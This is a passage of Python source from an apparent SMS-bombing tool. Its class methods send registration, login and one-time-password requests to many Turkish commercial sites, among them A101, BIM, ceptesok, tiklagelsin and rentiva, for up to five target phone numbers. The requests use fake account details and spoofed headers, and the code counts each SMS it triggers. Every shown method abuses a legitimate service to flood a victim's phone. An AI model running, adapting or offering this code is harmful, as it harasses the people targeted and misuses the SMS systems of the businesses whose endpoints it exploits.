                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
          
        
    #wmf.com.tr
    def Wmf(self):        
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                    "confirm": "true",
                    "date_of_birth": "1956-03-01",
                    "email": self.mail,
                    "email_allowed": "true",
                    "first_name": "Memati",
                    "gender": "male",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "phone": f"0{numara}"
                })
                    if wmf.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
         
    
    #istegelsin.com
    def IsteGelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(numara)}}
                    r = requests.post("https://prod.fasapi.net:443/",  json=json)
                    if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> prod.fasapi.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> prod.fasapi.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #bim
    def Bim(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})
                    if bim.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
        
    #ceptesok.com
    def Sok(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": numara, "token_type": "register_token"})
                    if len(r.json()["meta"]["messages"]["success"]) != 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "GENERATE_OTP", 
                             "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                             "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                         "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                         "phone": numara
                                        }
                            }
                    tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
                    if tiklagelsin.json()["data"]["generateOtp"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> svc.apps.tiklagelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> svc.apps.tiklagelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    

            
    #a101.com.tr
    def A101(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.a101.com.tr:443/users/otp-login/"
                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}
                    r = requests.post(url,data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #englishhome.com
    def Englishhome(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
                    if home.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #sakasu.com.tr
    def Sakasu(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"phone": numara}
                    su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
                    if su.json()["status"] == "ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #rentiva.com
    def Rentiva(self): 
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://rentiva.com:443/api/Account/Login"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
                    json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": numara, "type": 1}
                    rentiva = requests.post(url, headers=headers, json=json)
                    if rentiva.json()["success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #bineq.tech
    def Bineq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}"
                    headers = {"Accept": "application/json, text/plain, */*", "Con
